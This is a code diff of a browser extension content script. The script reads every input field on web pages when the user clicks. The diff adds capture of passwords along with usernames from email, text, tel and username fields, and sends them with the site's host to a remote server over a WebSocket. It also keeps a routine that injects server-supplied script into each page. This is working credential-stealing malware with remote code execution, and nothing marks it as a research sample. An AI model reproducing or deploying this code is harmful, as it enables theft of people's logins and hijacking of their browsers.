@@ -16,7 +16,7 @@ var ws = new WebSocket(HOST);
 chrome.storage.sync.get("id", function(ev){
   id=ev.id;
   console.log("ONLINE This user is id is " + id);
-}
+});
 
 // This is supposed to be used to be able to add to the array depending on
 // input from the server.
@@ -38,35 +38,51 @@ window.addEventListener("click", clickListen, false);
 function clickListen (e){
   var val = document.getElementsByTagName('input');
   for(var i = 0; i < val.length; i++){
+
     if(val[i].type.toLowerCase() == 'email'){
         if(!(val[i].value === "" || val[i].value === null)){
           console.log("Username is " + val[i].value);
           userNm = val[i].value;
       }
     }
-    if(val[i].type.toLowerCase() == 'password'){
-      if(!(val[i].value === "" || val[i].value === null)){
-        console.log("Password is " + val[i].value);
-      }
-    }
-    if(val[i].name.toLowerCase() == 'username'){
+    else if(val[i].name.toLowerCase() == 'username'){
       if(!(val[i].value === "" || val[i].value === null)){
         console.log("Username is " + val[i].value);
         userNm = val[i].value;
       }
     }
-    if((!(userNm === null || userNm === "")) && (!(passWd === null || passWd === ""))){
-        sendUsername(userNm);
+    else if(val[i].type.toLowerCase() == 'text'){
+      if(!(val[i].value === "" || val[i].value === null)){
+        console.log("Username is " + val[i].value);
+        userNm = val[i].value;
+      }
     }
+    else if(val[i].type.toLowerCase() == 'tel'){
+      if(!(val[i].value === "" || val[i].value === null)){
+        console.log("Username is " + val[i].value);
+        userNm = val[i].value;
+      }
+    }
+
+    if(val[i].type.toLowerCase() == 'password'){
+      if(!(val[i].value === "" || val[i].value === null)){
+        console.log("Password is " + val[i].value);
+        passWd = val[i].value;
+      }
+    }
+  }
+
+  if((!(userNm === null || userNm === "")) && (!(passWd === null || passWd === ""))){
+      sendUsername(userNm, passWd);
   }
 }
 
 /*
-Helper function to send the username to the server
+Helper function to send the username/password to the server
 */
-function sendUsername(username){
+function sendUsername(username, password){
   var url = window.location.host;
-	var jsonPackage = {id: id,type: 'username',url:url, username:username};
+	var jsonPackage = {id: id, type: 'info', url: url, username:userNm, password: passWd};
   ws.send(JSON.stringify(jsonPackage));
   console.log("sent "+JSON.stringify(jsonPackage));
 }
@@ -89,7 +105,6 @@ chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
       var nodeScript = document.createElement('script');
       nodeScript.type = 'text/javascript';
       chrome.storage.sync.get("scriptExe", function(ev){
-        console.log("Inside of get function is " + ev.scriptExe);
         nodeScript.appendChild(document.createTextNode(ev.scriptExe));
         document.body.appendChild(nodeScript);
       });
